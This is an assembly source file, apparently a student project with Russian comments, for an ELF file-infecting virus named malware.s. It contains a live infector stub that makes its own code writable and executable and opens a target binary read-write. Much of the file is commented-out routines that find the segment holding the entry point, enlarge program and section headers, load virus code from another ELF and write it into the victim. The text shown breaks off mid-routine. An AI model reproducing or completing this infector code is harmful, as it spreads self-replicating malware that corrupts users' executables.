
    // Compile:
    //      gcc malware.s -nostdlib -o asm
    // или:
    //      as malware.s -nostdlib -o asm.o
    //      ld asm.o -o asm
    // также cmdstring для отладки макросов:
    // as -a malware.s -nostdlib -o asm
    // ключ -a позволяет увидеть генерацию макросов


    // Полезное или может пригодиться:
    // https://reverse.put.as/wp-content/uploads/2011/03/gdbreferencecard.html
    // https://cs.lmu.edu/~ray/notes/gasexamples/
    // https://stackoverflow.com/questions/14361248/whats-the-difference-of-section-and-segment-in-elf-file-format
    // http://tigcc.ticalc.org/doc/gnuasm.html#SEC39
    // https://www.opennet.ru/docs/RUS/gas/gas-4.html


    // Если эта переменная существует,
    // макросы будут генерировать отладочный вывод
    .set DEBUG_MODE, 1

    // https://www.opennet.ru/docs/RUS/gas/gas-7.html#ss7.38
    // \@ хранит счетчик, содержащий число, которое
    // показывает, сколько раз был выполнен этот
    // макрос; вы можете вывести это число при
    // помощи \@, но только внутри определения макроса.

    .macro CHECK_CANARY
        .ifdef DEBUG_MODE
            mov     _canary(%rip), %rax
            mov    $0xDEADBEEFBAADF00D, %rbx
            cmp    %rax, %rbx
            je      1f              # forward label 1
            lea     2f(%rip), %rsi  # forward label 2
            mov     $len_e_canary_\@, %rdx
            jmp     _error_msg
        2:
            .string "ERR: canary \@\n"
            .set len_e_canary_\@, . - 2b
        1:
        .endif
    .endm

    // Макрос для генерации сообщений об ошибках

    .macro ERR_MSG name msg
        .ifdef DEBUG_MODE
            \name\()_error:
                lea     \name\()_msg_e(%rip), %rsi
                mov     $len_e_\name, %rdx
                // call    _my_write
                // xor     %rax, %rax
                // jmp     \name\()_exit
                jmp     _error_msg
            \name\()_msg_e:
                .ascii "ERR: \msg\()\n"
                .set len_e_\name, . - \name\()_msg_e
        .else
            \name\()_error:
                jmp     \name\()_exit
        .endif
    .endm

    // флаг для openfile (только чтение)
    .set O_RDONLY, 0x0
    .set O_RDWR, 0x2
    .set MAP_PRIVATE, 0x2
    .set PROT_NONE, 0x0
    .set PROT_READ, 0x1
    .set PROT_WRITE, 0x2
    .set PROT_EXEC, 0x4

.macro O_RDWR_AND_O_APPEND reg
    mov $0x402, \reg
.endm

.macro PROT_READ reg
    mov $0x1, \reg
.endm

.macro PROT_READ_OR_PROT_WRITE reg
    mov $0x3, \reg
.endm

.macro PROT_NONE reg
    mov $0x0, \reg
    .endm



    // На случай если инфектор будет слинкован
    // с другими библиотеками, лучше сделать так,
    // чтобы его код был в отдельной подсекции -
    // так проще его извлекать.

    // Тогда основная подсекция будет содержать
    // код псевдо-жертвы:
    // -------------------------------------------
    .text 0

    .global	_start
	.type	_start, @function

_start:
    jmp     _start_infector
_start_victim:
    lea     _msg_victim(%rip), %rsi
    mov     $len_msg_victim, %rdx
    mov     $0x1, %rax          # write
    mov     %rax, %rdi          # to stdout
    syscall
_exit_victim:
    mov $0x3c, %rax
    mov $0x0,  %rdi
    syscall


    // -------------------------------------------
    // данные псевдо-жертвы
    .data 0
_msg_victim:
    .ascii "Hello, I am victim\n"
    .set len_msg_victim, . - _msg_victim


    // -------------------------------------------
    // Подсекция кода инфектора
    .text 1

// .macro ADDR_MASQUE reg
//     mov $0xF, \reg
// .endm

//     # макросы для доступа к полям структуры ElfHdr
//     # в reg принимает адрес, по которому лежит заголовок, кладет значение поля в reg2
// .macro ELF_E_ENTRY reg, reg2
//     add $0x18, \reg
//     mov (\reg), \reg2
// .endm

// .macro ELF_E_PHOFF reg, reg2
// 	    add $0x20, \reg
// 	    mov (\reg), \reg2
// .endm

// .macro ELF_E_SHOFF reg, reg2
// 	    add $0x28, \reg
// 	    mov (\reg), \reg2
// .endm

// .macro ELF_E_PHNUM reg, reg2
// 	    add $0x38, \reg
// .endm

// .macro ELF_E_SHNUM reg, reg2
// 	    add $0x3c, \reg
// .endm

//     # макросы для доступа к полям структуры Phdr
// .macro PHDR_P_OFFSET reg, reg2
//     add $0x8, \reg
// 	mov (\reg), \reg2
// .endm

// .macro PHDR_P_VADDR reg, reg2
//     add $0x10, \reg
// 	mov (\reg), \reg2
// .endm

// .macro PHDR_P_PADDR reg, reg2
//     add $0x18, \reg
// 	mov (\reg), \reg2
// .endm

// .macro PHDR_P_FILESZ reg, reg2
//     add $0x20, \reg
// 	mov (\reg), \reg2
// .endm

// .macro PHDR_P_MEMSZ reg, reg2
//     add $0x28, \reg
// 	mov (\reg), \reg2
// .endm

// .macro SHDR_SH_ADDR reg, reg2
//     add $0x10, \reg
// 	mov (\reg), \reg2
    // .endm

// elf_malware_addr:
//     .long 0

// elf_victim_addr:
//     .long 0



// INTENT:
// ~~~~~~
// Мы хотим разрешить самомодифицирующийся код.
// Для этого мы должны передать MPROTECT выровненный
// адрес.
// Этот адрес должен быть выше адреса _start_infector.
// Он совпадает с адресом начала сегмента кода,
// но мы не можем быть в этом уверены, когда находимся
// в зараженном файле.


 	.global	_start_infector
	.type	_start_infector, @function
_start_infector:
    lea     _start_infector(%rip), %rdi
    and     $~0x3FF, %rdi       # ..in %RDI
    lea     _fin_infector(%rip), %rsi   # get end addr
    sub     %rdi, %rsi          # total size - %RSI
    // CALL MPROTECT            # start addr - %RDI
    mov     $7, %rdx            # RW+EXEC flags - $RDX
    mov     $10, %rax           # mprotect handle
    syscall
    test    %rax, %rax
    jz      _mprotect_is_ok
    // if mprotect failed:

    .ifdef DEBUG_MODE
    lea     _e_mprotect(%rip), %rsi
    mov     $len_e_mprotect, %rdx
    .endif

    jmp     _error_msg

    .ifdef DEBUG_MODE
_e_mprotect:
    .string "ERR: mprotect in _start\n"
    .set len_e_mprotect, . - _e_mprotect
    .endif

_old_rsp:
    .quad 0     # вершина стека жертвы
_mprotect_is_ok:
    // Set Stack
    mov     %rsp, _old_rsp(%rip)     # save old %RSP
    lea     _stack_bottom(%rip), %rsp

    // call    test_my_memcpy
    // call    test_my_fread
    // call    test_cnvrt_addr_in_16_byte
    // call    test_cnvrt_num_to_hex_string
    // call    test_cnvrt_addr_in_16_byte


    // call    test_fwrite
    // call    test_my_printf1
    // call    test_my_printf2
    // call    test_my_printf3
    // call    test_read_elf_header
    // call    test_read_program_header
    // call    test_read_section_header
    // call    test_read_all_program_headers
    // call    test_read_all_section_headers
    // call    test_find_last_segment_header
    // call    test_shdr_offset_and_addr_recount
    // call    test_find_infection_segment
    // call    test_find_infection_section
    // call    test_phdr_offset_and_addr_recount
    // call    test_pwrite_into_file
    // call    test_pwrite

    // CHECK_CANARY

    call     _test_file_infection

    // call    test_find_virus_signature
    // call    test_variable_macroses
    // call     recombine_elf

    jmp     _end_infector

// //     # тестирует макросы для взаиможействия с переменными
// //     # значения переменных задаются вручную, могут быть любыми
// //     # принимает в r8 адрес базы, куда записываются переменные
// // test_variable_macroses:
// //     // mov     %r8, %rdi
// //     // SET_VICTIM_ELF_ADDR %rdi, $0x4000b0

// //     // mov     %r8, %rdi
// //     // SET_VICTIM_PHDR_TABLE_ADDR %rdi, $0x4000b1

// //     // mov     %r8, %rdi
// //     // SET_VICTIM_PHDR_TABLE_SIZE %rdi, $0x70

// //     // mov     %r8, %rdi
// //     // SET_VICTIM_SHDR_TABLE_ADDR %rdi, $0x4000b2

// //     // mov     %r8, %rdi
// //     // SET_VICTIM_SHDR_TABLE_SIZE %rdi, $0x80

// //     // mov     %r8, %rdi
// //     // SET_INFECTED_SEG_ADDR %rdi, $0x4000b3

// //     // mov     %r8, %rdi
// //     // SET_INFECTED_SEG_SIZE %rdi, $0x100

// //     // mov     %r8, %rdi
// //     // SET_INFECTED_SECT_ADDR %rdi, $0x4000b3

// //     // mov     %r8, %rdi
// //     // SET_VICTIM_CODE_BEFORE_INFECT_POINT_ADDR %rdi, $0x4000b4

// //     // mov     %r8, %rdi
// //     // SET_VICTIM_CODE_BEFORE_INFECT_POINT_SIZE %rdi, $0x300

// //     // mov     %r8, %rdi
// //     // SET_VICTIM_CODE_AFTER_INFECT_POINT_ADDR %rdi, $0x4000b5

// //     // mov     %r8, %rdi
// //     // SET_VICTIM_CODE_AFTER_INFECT_POINT_SIZE %rdi, $0x350

// //     // mov     %r8, %rdi
// //     // SET_VIRUS_CODE_ADDR %rdi, $0x4000b6

// //     // mov     %r8, %rdi
// //     // SET_VIRUS_CODE_SIZE %rdi, $0x400


// //     // mov     %r8, %rdi
// //     // mov     %r8, %rcx
// //     // GET_VICTIM_ELF_ADDR %rdi, %rsi

// //     // mov     $0x0, %rdi
// //     // mov     $0x10, %rdx
// //     // mov     $0x0, %r8
// //     // call    my_printf

// //     // mov     %rcx, %rdi
// //     // GET_VICTIM_PHDR_TABLE_ADDR %rdi, %rsi

// //     // mov     $0x0, %rdi
// //     // mov     $0x10, %rdx
// //     // mov     $0x0, %r8
// //     // call    my_printf

// //     // mov     %rcx, %rdi
// //     // GET_VICTIM_PHDR_TABLE_SIZE %rdi, %rsi
// // 	// mov     $0x0, %rdi
// // 	// mov     $0x10, %rdx
// // 	// mov     $0x0, %r8
// // 	// call    my_printf

// //     // mov     %rcx, %rdi
// //     // GET_VICTIM_SHDR_TABLE_ADDR %rdi, %rsi
// //     // mov     $0x0, %rdi
// //     // mov     $0x10, %rdx
// // 	// mov     $0x0, %r8
// //     // call    my_printf

// //     // mov     %rcx, %rdi
// //     // GET_VICTIM_SHDR_TABLE_SIZE %rdi, %rsi
// //     // mov     $0x0, %rdi
// //     // mov     $0x10, %rdx
// // 	// mov     $0x0, %r8
// //     // call    my_printf

// //     // mov     %rcx, %rdi
// //     // GET_INFECTED_SEG_ADDR %rdi, %rsi
// //     // mov     $0x0, %rdi
// //     // mov     $0x10, %rdx
// // 	// mov     $0x0, %r8
// //     // call    my_printf

// //     // mov     %rcx, %rdi
// //     // GET_INFECTED_SEG_SIZE %rdi, %rsi
// //     // mov     $0x0, %rdi
// //     // mov     $0x10, %rdx
// // 	// mov     $0x0, %r8
// //     // call    my_printf

// //     // mov     %rcx, %rdi
// //     // GET_INFECTED_SECT_ADDR %rdi, %rsi
// //     // mov     $0x0, %rdi
// //     // mov     $0x10, %rdx
// // 	// mov     $0x0, %r8
// //     // call    my_printf

// //     // mov     %rcx, %rdi
// //     // GET_VICTIM_CODE_BEFORE_INFECT_POINT_ADDR %rdi, %rsi
// //     // mov     $0x0, %rdi
// //     // mov     $0x10, %rdx
// // 	// mov     $0x0, %r8
// //     // call    my_printf

// //     // mov     %rcx, %rdi
// //     // GET_VICTIM_CODE_BEFORE_INFECT_POINT_SIZE %rdi, %rsi
// //     // mov     $0x0, %rdi
// //     // mov     $0x10, %rdx
// // 	// mov     $0x0, %r8
// //     // call    my_printf

// //     // mov     %rcx, %rdi
// //     // GET_VICTIM_CODE_AFTER_INFECT_POINT_ADDR %rdi, %rsi
// //     // mov     $0x0, %rdi
// //     // mov     $0x10, %rdx
// // 	// mov     $0x0, %r8
// //     // call    my_printf

// //     // mov     %rcx, %rdi
// //     // GET_VICTIM_CODE_AFTER_INFECT_POINT_SIZE %rdi, %rsi
// //     // mov     $0x0, %rdi
// //     // mov     $0x10, %rdx
// // 	// mov     $0x0, %r8
// //     // call    my_printf

// //     // mov     %rcx, %rdi
// //     // GET_VIRUS_CODE_ADDR %rdi, %rsi
// //     // mov     $0x0, %rdi
// //     // mov     $0x10, %rdx
// // 	// mov     $0x0, %r8
// //     // call    my_printf

// //     // mov     %rcx, %rdi
// //     // GET_VIRUS_CODE_SIZE %rdi, %rsi
// //     // mov     $0x0, %rdi
// //     // mov     $0x10, %rdx
// // 	// mov     $0x0, %r8
// //     // call    my_printf

// //     ret
// //     # принимает в rdi дескриптор файла,
// //     # в rsi - указатель на строку, в rdx - длину строки,
// //     # в rcx - смещение от нач файла

// // pwrite:
// //     push %rax

// //     mov  $0x12, %rax
// //     syscall

// //     pop  %rax
// //     ret

// // test_pwrite:

// //     pushq   %rbp
// // 	movq    %rsp, %rbp

// //     push    %rdi
// //     push    %rax
// //     push    %rsi
// //     push    %rdx

// //     mov     $file_name, %rdi
// //     O_RDWR_AND_O_APPEND  %rsi

// //     call    open

// //     push    %rax

// //     mov     %rax, %rdi
// //     mov     $msg, %rsi
// //     mov     $0x13, %rdx
// //     #mov     $0x0, %rcx

// //     call    pwrite

// //     mov     %rax, %rdi
// //     mov     $msg, %rsi
// //     mov     $0x13, %rdx
// //     #mov     $0x13, %rcx

// //     call    pwrite

// //     pop     %rdi
// //     call    close

// //     pop     %rdx
// //     pop     %rsi
// //     pop     %rax
// //     pop     %rdi

// //     pop     %rbp

// //     ret
// //     # находит сегмент PL_LOAD для заражения
// //     # принимает в rdi адрес начала таблицы заголовков программ
// //     # в rsi - их количество, в rdx - адрес e_entry жертвы

// //     .globl  find_infection_segment
// // 	.type	find_infection_segment, @function

// // find_infection_segment:
// //     push    %rbp
// //     mov     %rsp, %rbp

// //     push    %rbx
// //     push    %rcx

// //     mov     %rsi, %rcx

// // find_infection_segment_cycle:
// //     mov     %rdi, %rax

// //     mov     (%rdi), %ebx   # проверяем поле p_type
// //     cmp     $0x1, %rbx

// //     jne     next_iter_find_infection
// //     PHDR_P_VADDR %rdi, %rbx   # получаем поле p_vaddr

// //     cmp     %rdx, %rbx        # vaddr долен быть <= e_entry
// //     jg      next_iter_find_infection   # иначе переход на следующую итерацию

// //     mov    %rax, %rdi
// //     PHDR_P_FILESZ %rdi, %rsi  # получаем размер текущего сегмента

// //     add    %rsi, %rbx  # считаем адрес, на котором заканчивается текущий сегмент

// //     cmp    %rdx, %rbx   # адрес окончания текущего сегмента должен быть > e_entry
// //     jl     next_iter_find_infection

// //     jmp    find_infection_segment_end  # найден сегмент, содержащий в себе e_entry, выход
// // next_iter_find_infection:

// //     add     $0x38, %rax
// //     mov     %rax, %rdi

// //     loop    find_infection_segment_cycle

// // find_infection_segment_end:
// //     pop     %rcx
// //     pop     %rbx

// //     pop     %rbp
// //     ret

// // test_find_infection_segment:
// //     push    %rbp
// //     mov     %rsp, %rbp

// //     mov     $file_name3, %rdi
// //     mov 	$O_RDONLY,  %rsi
// //     call    openfile

// //     cmp     $0, %rax
// //     jle     test_find_infection_segment_end

// //     mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
// //     mov     %rax, %rsi

// //     ELF_E_PHOFF %rdi, %rcx
// //     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

// //     mov     %rax, %rdi

// //     ELF_E_PHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
// //     movl    (%rax), %ecx
// //     movzwl  %cx, %ecx

// //     mov     %rcx, %rdx

// //     mov     $0x38, %rax
// //     imul     %rcx,  %rax

// //     add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
// //     sub     %rax,  %rsp

// //     mov     %rax, %r8
// //     ELF_E_ENTRY %rdi, %rbx

// //     push    %rsi
// //     push    %rdx
// //     push    %r8

// //     mov     $e_entry_msg, %rdi
// //     mov     %rbx, %rsi
// //     mov     $0x10, %rdx
// //     mov     $0x10, %r8

// //     call    my_printf

// //     pop    %r8
// //     pop    %rdx
// //     pop    %rsi

// //     lea     (%rsp),  %rdi
// //     call    read_all_program_headers

// //     lea     (%rsp),  %rdi
// //     mov     %rcx, %rsi
// //     mov     %rbx, %rdx
// //     call    find_infection_segment

// //     mov     %rax, %rdi
// //     call    print_program_header

// //     add     %r8,  %rsp

// // test_find_infection_segment_end:
// //     pop    %rbp
// //     ret

// //     # увеличивает поля заголовка p_filesz и p_memsz на заданную величину
// //     # в rdi принимает указатель на заголовок
// //     # в rsi - число, на которое надо увеличить p_filesz и p_memsz

// //     .globl  add_size_to_phdr
// // 	.type	add_size_to_phdr, @function

// // add_size_to_phdr:

// //     add $0x20, %rdi
// //     add %rsi, (%rdi)

// //     add $0x8, %rdi
// //     add %rsi, (%rdi)

// //     ret

// //     # увеличивает полe заголовка sh_size на заданную величину
// //     # в rdi принимает указатель на заголовок
// //     # в rsi - число, на которое надо увеличить sh_size

// //     .globl  add_size_to_shdr
// // 	.type	add_size_to_shdr, @function

// // add_size_to_shdr:

// //     add $0x20, %rdi
// //     add %rsi, (%rdi)

// //     ret

// //     # находит последнюю секцию в заражаемом сегменте PL_LOAD
// //     # принимает в rdi адрес начала таблицы заголовков секций
// //     # в rsi - их количество, в rdx - адрес конца сегмента кода

// //     .globl  find_infection_seсtion
// // 	.type	find_infection_seсtion, @function

// // find_infection_seсtion:
// //     push    %rbp
// //     mov     %rsp, %rbp

// //     push    %rbx
// //     push    %rcx
// //     push    %r8
// //     push    %r9

// //     mov     %rsi, %rcx
// //     mov     %rdi, %r8

// // find_infection_section_cycle:
// //     mov     %rdi, %rax

// //     SHDR_SH_ADDR %rdi, %rsi

// //     cmp     %rdx, %rsi  # если текущий адрес секции находится за заражаемым сегментом
// //     jge     next_iter_find_section_infection  # идем на следующую итерацию

// //     mov     %r8, %r9     # иначе сравниваем с текущим сохраненным адресом заголовка
// //     SHDR_SH_ADDR %r9, %rbx

// //     cmp     %rbx, %rsi   # если адрес сохраненного заголовка > адреса текущего заголовка
// //     jle     next_iter_find_section_infection # переходим на следующую итерацию

// //     mov    %rax, %r8   # сохраняем новый заголовок
// // next_iter_find_section_infection:

// //     add     $0x40, %rax
// //     mov     %rax, %rdi

// //     loop    find_infection_section_cycle

// // find_infection_section_end:
// //     mov     %r8, %rax

// //     pop     %r9
// //     pop     %r8
// //     pop     %rcx
// //     pop     %rbx

// //     pop     %rbp
// //     ret

// // test_find_infection_section:
// //     push    %rbp
// //     mov     %rsp, %rbp

// //     mov     $file_name3, %rdi
// //     mov 	$O_RDONLY,  %rsi
// //     call    openfile

// //     cmp     $0, %rax
// //     jle     test_find_infection_section_end

// //     mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
// //     mov     %rax, %rsi

// //     push    %rax  # 0x7ffff7ff6000

// //     ELF_E_PHOFF %rdi, %rcx
// //     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

// //     mov     %rax, %rdi

// //     ELF_E_PHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
// //     movl    (%rax), %ecx
// //     movzwl  %cx, %ecx

// //     mov     %rcx, %rdx

// //     mov     $0x38, %rax
// //     imul    %rcx,  %rax

// //     pop     %r10

// //     add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
// //     sub     %rax,  %rsp

// //     mov     %rax, %r8
// //     ELF_E_ENTRY %rdi, %rbx

// //     push    %rsi
// //     push    %rdx
// //     push    %r8

// //     mov     $e_entry_msg, %rdi
// //     mov     %rbx, %rsi
// //     mov     $0x10, %rdx
// //     mov     $0x10, %r8

// //     call    my_printf

// //     pop    %r8
// //     pop    %rdx
// //     pop    %rsi

// //     lea     (%rsp),  %rdi
// //     call    read_all_program_headers

// //     lea     (%rsp),  %rdi
// //     mov     %rcx, %rsi
// //     mov     %rbx, %rdx
// //     call    find_infection_segment

// //     mov     %rax, %rdi  #0x40201e

// //     call    print_program_header

// //     mov     %r10, %rsi # положили адрес начала эльфа
// //     mov     %r8, %r10  # сохранили количество байт, которые резервировали

// //     mov     %rsi, %rdi
// //     mov     %rsi, %r9

// //     ELF_E_SHOFF %rdi, %rcx
// //     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

// //     ELF_E_SHNUM %r9, %rcx  # считаем, сколько места занимают все заголовки
// //     movl    (%r9), %ecx
// //     movzwl  %cx, %ecx

// //     mov     %rcx, %rdx

// //     mov     $0x40, %r9
// //     imul     %rcx,  %r9

// //     add     $8,   %r9  # резервируем место на стеке под заголовки (с запасом 8 байт)
// //     sub     %r9,  %rsp

// //     mov     %r9, %r11

// //     lea     (%rsp),  %rdi

// //     call    read_all_section_headers

// //     mov     %rax, %rdi   # взяли адерс сохраненного заголовка сегмента кода
// //     mov     %rdi, %r8

// //     PHDR_P_VADDR %r8, %rbx   # получаем поле p_vaddr
// //     PHDR_P_FILESZ %rdi, %r9   # получаем поле p_filesz

// //     add     %r9, %rbx   # высчитали, где кончается сегмент

// //     mov     %rdx, %rsi

// //     mov     %rbx, %rdx

// //     lea     (%rsp),  %rdi

// //     call    find_infection_seсtion

// //     push    %r11
// //     mov     $next_str, %rdi
// //     mov     $0x0, %rsi
// //     mov     $0x0, %rdx
// //     mov     $0x1, %r8

// //     call    my_printf

// //     mov     %rax, %rdi
// //     call    print_section_header

// //     pop     %r11
// //     add     %r10, %r11
// //     add     %r11, %rsp

// // test_find_infection_section_end:
// //     pop    %rbp
// //     ret

// //     # цель теста - выгрузить весь код, включая заголовки, одного эльфа, и скопировать
// //     # их в другой. Просто проверить, корректно ли pwrite записывает данные
// // test_pwrite_into_file:

// //     push    %rbp
// //     mov     %rsp, %rbp

// //     mov     $file_name3, %rdi
// //     mov 	$O_RDONLY,  %rsi
// //     call    openfile

// //     cmp     $0, %rax
// //     jle     test_pwrite_into_file_end

// //     push    %rax    # сохранили адрес, по которому записан эльф-файл

// //     mov     %rax, %rsi # считаем адрес,по которому лежат заголовки программ

// //     mov     %rax, %rdi
// //     ELF_E_PHOFF %rdi, %rcx
// //     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки 0x7ffff7ff7040

// //     push    %rsi         # сохранили адрес, по которому лежат заголовки, в стек

// //     mov     %rax, %rdi   # узнаем количество заголовков программ
// //     ELF_E_PHNUM %rdi, %rcx
// //     movl    (%rdi), %ecx
// //     movzwl  %cx, %ecx

// //     mov     %rcx, %rdx     # сохранили количество заголовков прграмм

// //     mov     $0x38, %rax    # считаем, сколько места они занимают
// //     imul    %rcx,  %rax    # 504 байта
// //     mov     %rax,  %r11    # сохранили сколько места занимают заголовки программ

// //     pop     %r10           # забрали адрес, по которому лежат заголовки
// //     pop     %rdi           # забрали адрес, по которому лежит эльф

// //     mov     %r10, %rax
// //     add     %r11, %rax     # посчитали, скакого адреса начинается код эльфа

// //     mov     %rax, %rsi     # 0x7ffff7ff7238
// //     mov     %rdi, %r12     # 0x7ffff7ff7000

// //     ELF_E_SHOFF %r12, %rcx   # получили адрес, по которому лежат заголовки сенкций
// //     mov     %rdi, %r12
// //     add     %rcx, %r12      # 0x7ffff7ff89a8

// //     push    %rdi            # сохранили в стеке адрес начала эльфа

// //     mov     %rax, %r8       # адрес начала кода
// //     mov     %r12, %rbx      # адрес заголовков секций
// //     sub     %r8,  %rbx      # посчитали размер кода

// //     ELF_E_SHNUM %rdi, %rcx  # считаем, сколько места занимают все заголовки
// //     movl    (%rdi), %ecx
// //     movzwl  %cx, %ecx

// //     mov     %rdx,  %rax      # сохранили количество заголовков программ
// //     mov     %rcx,  %rdx      # сохранили количество заголовов секций

// //     mov     $0x40, %r9
// //     imul    %rcx,  %r9      # посчитали, сколько места начинаются секции ( 1984 )

// //     pop     %rdi            # забрали адрес начала эльфа

// //     # r9 - размер, сколько места занимают заголовки секций
// //     # r11 - размер, сколько места занимают заголовки программ
// //     # rdi - адрес начала эльфа
// //     # r10 - адрес заголовков программ
// //     # r12 - адрес заголовков секций
// //     # rsi - адрес начала кода
// //     # rbx - размер этого кода
// //     # rax - количество заголовков программ
// //     # rdx - количество заголовков секций
// //     # свободные регистры - rcx, r8, r12 и т.д.

// //     push     %r11
// //     push     %r12

// //     push    %rsi
// //     push    %rdi

// //     mov     $new_elf_file, %rdi      # открываем файл на запись
// //     O_RDWR_AND_O_APPEND %rsi
// //     call    open

// //     pop     %rdi
// //     pop     %rsi

// //     push    %rdi

// //     call    print_elf_header

// //     pop     %rdi

// //     pop     %r12
// //     pop     %r11

// //     push    %rsi

// //     mov     %rdi, %rsi  # записали заголовок эльфа
// //     mov     %rax, %rdi
// //     mov     $0x40, %rdx

// //     push    %r11
// //     push    %r12

// //     call    pwrite

// //     pop     %r12
// //     pop     %r11

// //     mov     %r10, %rsi  # записали все заголовки программ
// //     mov     %r11, %rdx  # размер в памяти

// //     push    %r12

// //     call    pwrite

// //     pop     %r12

// //     pop     %rsi        # адрес кода
// //     mov     %rbx, %rdx  # размер кода

// //     push    %r12

// //     call    pwrite

// //     pop     %r12

// //     mov     %r12, %rsi  # адрес секций
// //     mov     %r9, %rdx   # размер секций

// //     call    pwrite

// //     call    close

// // test_pwrite_into_file_end:
// //     pop     %rbp
// //     ret

_test_file_infection:

    // CHECK_CANARY

    lea     _file_name3(%rip), %rdi
    mov     $O_RDWR, %rsi
    call    _openfile
    // error handling
    cmp     $0, %rax
    jle     test_file_infection_end

    // mov     %r8, %rsi
    // mov     set_victim_elf_addr, %rax # сохранили адрес эльф-файла в памяти 0x7ffff7ff7000

//     mov     %rax, %rsi # считаем адрес,по которому лежат заголовки программ
//     mov     %rax, %rdi

//     ELF_E_PHOFF %rdi, %rcx
//     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки 0x7ffff7ff7040

//     mov     %r8, %rdi
//     SET_VICTIM_PHDR_TABLE_ADDR %rdi, %rsi  # сохранили адрес, заголовков программ

//     mov     %rax, %rdi   # узнаем количество заголовков программ
//     ELF_E_PHNUM %rdi, %rcx
//     movl    (%rdi), %ecx
//     movzwl  %cx, %ecx

//     mov     %r8, %r9
//     SET_VICTIM_PHDR_AMOUNT %r9, %rcx

//     mov     %rcx, %rdx     # сохранили количество заголовков прграмм

//     mov     $0x38, %rax    # считаем, сколько места они занимают
//     imul    %rcx,  %rax    # 504 байта
//     mov     %rax,  %r11    # сохранили сколько места занимают заголовки программ 0x1f8

//     mov     %r8, %rdi
//     SET_VICTIM_PHDR_TABLE_SIZE %rdi, %r11

//     mov     %r8, %rdi
//     mov     %r8, %rsi

//     GET_VICTIM_PHDR_TABLE_ADDR %rdi, %r10 # забрали адрес, по которому лежат заголовки

//     GET_VICTIM_ELF_ADDR %rsi, %rdi # забрали адрес, по которому лежит эльф

//     mov     %r10, %rax
//     add     %r11, %rax     # посчитали, с какого адреса начинается код эльфа

//     mov     %rax, %rsi     # 0x7ffff7ff7238
//     mov     %rdi, %r12     # 0x7ffff7ff7000

//     mov     %r8, %r9
//     SET_VICTIM_CODE_BEFORE_INFECT_POINT_ADDR %r9, %rsi

//     ELF_E_SHOFF %r12, %rcx   # получили адрес, по которому лежат заголовки сенкций
//     mov     %rdi, %r12
//     add     %rcx, %r12      # 0x7ffff7ff89a8

//     mov     %r8, %rcx
//     SET_VICTIM_SHDR_TABLE_ADDR %rcx, %r12  #  адрес заголовков секций

//     mov     %r8, %r9

//     mov     %rax, %r8       # адрес начала кода
//     mov     %r12, %rbx      # адрес заголовков секций

//     ELF_E_SHNUM %rdi, %rcx  # считаем, сколько места занимают все заголовки
//     movl    (%rdi), %ecx
//     movzwl  %cx, %ecx

//     mov     %r9, %r8

//     SET_VICTIM_SHDR_AMOUNT %r9, %rcx

//     mov     %r8, %r9

//     GET_VICTIM_ELF_ADDR %r9, %rdi # забрали адрес начала эльфа

//     mov     %rdx,  %rax      # сохранили количество заголовков программ
//     mov     %rcx,  %rdx      # сохранили количество заголовов секций

//     mov     $0x40, %r9
//     imul    %rcx,  %r9      # посчитали, сколько места занимают секции ( 1984 )

//     mov     %r8, %rcx
//     SET_VICTIM_SHDR_TABLE_SIZE %rcx, %r9   #  размер заголовков секций

//     # r8  - адрес базы переменных 0x40219b
//     # r9 - размер, сколько места занимают заголовки секций
//     # r11 - размер, сколько места занимают заголовки программ
//     # rdi - адрес начала эльфа
//     # r10 - адрес заголовков программ
//     # r12 - адрес заголовков секций
//     # rsi - адрес начала кода
//     # rax - количество заголовков программ
//     # rdx - количество заголовков секций
//     # свободные регистры - rcx, r12 и т.д.

// get_virus_code:
//     mov     $virus_file_name, %rdi
//     mov 	$O_RDONLY,  %rsi
//     call    _openfile

//     cmp     $0, %rax
//     jle     test_file_infection_end

//     mov     %rax, %rdi      # 0x7ffff7ff1000

//     ELF_E_PHOFF %rdi, %rcx
//     mov     %rax, %rdi
//     add     %rcx, %rdi  # адрес, где нач. заголовки программ вируса 0x7ffff7ff2040

//     mov     %rcx, %rbx

//     mov     %rax, %rsi  # узнали количество заголовков программ вируса
//     ELF_E_PHNUM %rsi, %rcx
//     movl    (%rsi), %ecx
//     movzwl  %cx, %ecx

//     mov     $0x38, %rdx     # считаем, сколько места они занимают
//     imul    %rcx,  %rdx

//     add     %rdx,  %rdi     # узнали адрес, где начинется код вируса 0x7ffff7ff20b0

//     mov     %r8, %rcx
//     SET_VIRUS_CODE_ADDR %rcx, %rdi

//     mov     %rax, %rsi
//     ELF_E_SHOFF %rsi, %rcx  # узнали смещение заголовков секций вируса

//     mov     %rax, %rsi
//     add     %rcx, %rsi      # узнали адрес, по которому они начинаются 0x7ffff7ff68e8

//     sub     %rdi, %rsi      # узнали размер кода вируса  0x5838

//     mov     %r8, %rcx
//     SET_VIRUS_CODE_SIZE %rcx, %rsi

// find_poin_for_infection:

//     mov %r8, %r9
//     mov %r8, %rdi

//     GET_VICTIM_CODE_BEFORE_INFECT_POINT_ADDR %rdi, %r8  # адрес кода жертвы 0x7ffff7ff7238
//     mov %r9, %rcx
//     GET_VICTIM_PHDR_TABLE_SIZE %rcx, %r11  # размер заголовков программ жертвы

//     mov %r9, %rcx
//     GET_VICTIM_PHDR_TABLE_ADDR %rcx %r10   # адрес заголовков программ жертвы

//     mov %r9, %rcx
//     GET_VICTIM_ELF_ADDR %rcx, %rax

//     mov     %rax, %rdx

//     ELF_E_ENTRY %rdx, %rcx   # узнали точку входа в жертву

//     mov     %r10, %rdi       # адрес заголовков программ
//     mov     %rcx, %rdx       # e_entry 0x4003e0

//     mov     %r9, %rcx
//     GET_VICTIM_PHDR_AMOUNT %rcx, %rsi

//     call    find_infection_segment

//     mov     %rax, %rdx     # адрес заражаемого сегмента 0x7ffff7ff70b0

//     mov     %r9, %rcx
//     SET_INFECTED_SEG_ADDR %rcx, %rdx

//     PHDR_P_VADDR %rdx, %rsi
//     mov     %rax, %rdx
//     PHDR_P_FILESZ %rdx, %rcx
